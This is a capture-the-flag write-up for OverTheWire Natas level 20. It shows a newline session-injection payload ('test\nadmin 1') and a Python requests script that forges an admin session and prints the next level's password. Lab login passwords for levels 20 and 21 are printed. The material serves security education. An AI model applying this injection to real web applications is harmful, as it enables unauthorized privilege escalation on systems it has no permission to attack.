# Natas CTF Solutions  

## Natas Level 20  

### 🌐 **Challenge Description**  
Natas teaches the basics of server-side web security. Each level consists of a website located at:  
👉 `http://natasX.natas.labs.overthewire.org` (where **X** is the level number).  

---

### 🎯 **Goal**  
- Exploit session-based authentication using **session injection**.  
- Retrieve the password for the next level.  

---

## 🚀 **Solution**  

### **Step 1: Open the URL**  
Visit:  
```  
http://natas20.natas.labs.overthewire.org  
```  

---

### **Step 2: Enter Login Credentials**  
- **Username:** `natas20`  
- **Password:** Use the password from Natas Level 19:  
```
p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
```  

![Home_Page](https://github.com/user-attachments/assets/5fa491f6-9e06-490a-9690-dc420fb926e4)

---

### **Step 3: Analyze the Webpage**  
- The webpage sets a **PHP session** after login.  
- The session data is based on user input and stored directly in the cookie.  
- If the session data is modified, it may allow privilege escalation.  

![Page_Source](https://github.com/user-attachments/assets/4b7f02fa-cfbc-4697-afac-ad3d5e35446f)

---

### **Step 4: Inject Payload**  
The goal is to exploit session manipulation by injecting a newline character (`\n`) to modify the session content.  

✅ **Payload:**  
- `name="test\nadmin 1"`  
- This payload will create a session where `admin = 1`, giving admin access.  

---

### **Step 5: Exploit with Python Script**  
Use this Python script to automate the attack:  

```python
import requests

# Authentication details
username = "natas20"
url = "http://natas20.natas.labs.overthewire.org"
password = "p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw"

# Inject newline and set admin = 1
payload = dict(name="test\nadmin 1")

# Send POST request with payload
r = requests.post(url, auth=(username, password), data=payload)

# Capture session cookie
cookie = r.cookies.get_dict()

# Use session cookie to verify admin access
d = requests.get(url, auth=(username, password), cookies=cookie)

# Output result
print(d.content)
```

✅ **How the script works:**  
1. Sends a `POST` request with a malicious payload (`name="test\nadmin 1"`).  
2. The server processes the input and stores the session data.  
3. A newline (`\n`) splits the session data, allowing it to interpret `admin = 1`.  
4. When the session is reused, the server treats the user as an **admin**.  

---

### **Step 6: Output**  
After running the script, the output will reveal the password for the next level:  
```  
The password for natas21 is: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
```

![Password](https://github.com/user-attachments/assets/78c4f3a7-4f08-4591-b1c8-5fd57c7392ef)

---

### **✅ Password for Natas Level 21**  
```
BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
```  

---

## 💡 **Lessons Learned**  
✔️ **Session Injection:** Newline characters (`\n`) can manipulate session data.  
✔️ **Session Hijacking:** Session data directly influenced by user input can lead to privilege escalation.  
✔️ **Sanitization:** Servers must sanitize and validate session data to prevent injection attacks.  

---

## 🖼️ **Screenshots**  
| Step | Screenshot |  
|------|------------|  
| Step 3 – Page Source Code | ![Page_Source](https://github.com/user-attachments/assets/4b7f02fa-cfbc-4697-afac-ad3d5e35446f) |  
| Step 6 – Found Password | ![Password](https://github.com/user-attachments/assets/78c4f3a7-4f08-4591-b1c8-5fd57c7392ef) |  

---

## 🎯 **Next Level**  
Use the password to access **Natas Level 21**:  
👉 [http://natas21.natas.labs.overthewire.org](http://natas21.natas.labs.overthewire.org)  

---
